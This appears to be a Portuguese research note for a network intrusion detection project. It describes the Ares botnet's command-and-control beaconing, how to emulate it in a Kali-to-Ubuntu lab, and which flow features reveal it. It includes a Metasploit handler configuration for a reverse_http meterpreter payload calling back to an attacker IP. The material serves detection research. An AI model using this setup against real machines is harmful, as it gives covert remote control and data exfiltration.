# Botnet - Ares

- **Classe no CSE-CIC-IDS2018:** `Botnet Ares`
- **Volume no Dataset Corrigido:** 142.921 fluxos
- **Camada OSI:** Camada 7 (Comando e Controle via HTTP/HTTPS)
- **Alvo no Laboratório:** Vítima Ubuntu / Comunicação C2C com o Kali
- **Status de Reprodução:** Emulável via sessão de C2 (Beaconing Periódico)

---

## 1. Ferramenta no Kali Linux

- **Ferramenta Original:** Ares Botnet (software C2 open-source em Python)
- **Alternativas no Kali Linux:**
  - Instalação do repositório oficial da botnet Ares (Python 2/3).
  - Frameworks C2 integrados nativos no Kali: `metasploit-framework` (payloads HTTP/HTTPS com `Meterpreter` em modo beaconing) ou `sliver` / `covenant`.
  - Scripts Python customizados para emulação controlada de *beaconing* HTTP periódico.

---

## 2. Como a Ferramenta Realiza o Ataque

A botnet **Ares** opera sob o paradigma clássico de **Command and Control (C2)** distribuído:

1. **Instalação do Agente (Bot):**
   Um executável/script Python é instalado na máquina vítima (em um cenário real, entregue via phishing ou exploit).
2. **Polling Periódico de Comando (Beaconing):**
   O agente inicia conexões de saída (outbound) em intervalos temporais regulares (ex.: a cada 5, 10 ou 30 segundos) via requisições HTTP GET/POST para o servidor C2 do atacante. Essa abordagem contorna com facilidade firewalls de borda e regras de NAT de entrada, já que a conexão se origina de dentro da rede.
3. **Recebimento de Tarefas e Execução Remota:**
   Quando o operador digita um comando no painel C2 (ex.: comandos shell, coleta de senhas, listagem de processos, varredura interna), o servidor responde na requisição HTTP subsequente com a instrução codificada.
4. **Exfiltração de Resultados:**
   O agente executa o comando localmente no sistema operacional da vítima e envia o resultado de volta ao servidor C2 por meio de uma requisição HTTP POST (com payload codificado em Base64 ou criptografado).

---

## 3. Emulação no Testbed (Kali $\leftrightarrow$ Ubuntu)

Para emular o padrão comportamental de rede do Ares sem a necessidade de manter uma botnet completa ativa:
- Um script de agente em Python na máquina vítima realiza chamadas periódicas via HTTP (`requests.get`) para uma porta de escuta no Kali.
- Alternativamente, via Metasploit, configura-se um payload reverso com timer de sleep:

```bash
# Configuração conceitual no msfconsole (Kali)
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_http
set LHOST [IP_KALI]
set LPORT 8080
set SessionCommunicationTimeout 3600
exploit -j
```

---

## 4. Assinatura e Impacto nas Features do NIDS (ALF-MoE)

O tráfego de C2 de botnet possui características estatísticas muito distintas de ataques volumétricos:

| Feature de Fluxo | Comportamento Observado | Justificativa Operacional |
| :--- | :---: | :--- |
| `Flow IAT Mean` / `Flow IAT Std` | **Previsível e Regular** | Intervalos fixos de *heartbeat/beaconing* com baixa variância temporal. |
| `Idle Mean` | **Elevado** | Longos períodos de ociosidade entre checagens de tarefas. |
| `Flow Packets/s` | **Baixo** | Tráfego discreto para evitar detecção por volume anômalo. |
| `Fwd Packet Length Mean` | **Pequeno e Uniforme** | Requisições HTTP curtas de status (`GET /checkin`). |
| `Bwd Packet Length Max` | **Variável** | Respostas pequenas quando ocioso, maiores quando há envio de comandos ou scripts. |
| `Active Mean` | **Muito Curto** | Transações HTTP rápidas a cada ciclo de polling. |

---

## 5. Relação com outras Notas

- [[00 - Mapeamento de Ataques Kali Linux]]
- [[Infiltration - Communication Victim Attacker]]
- [[SSH - Brute Force]]
- [[Ambiente de Ataques]]
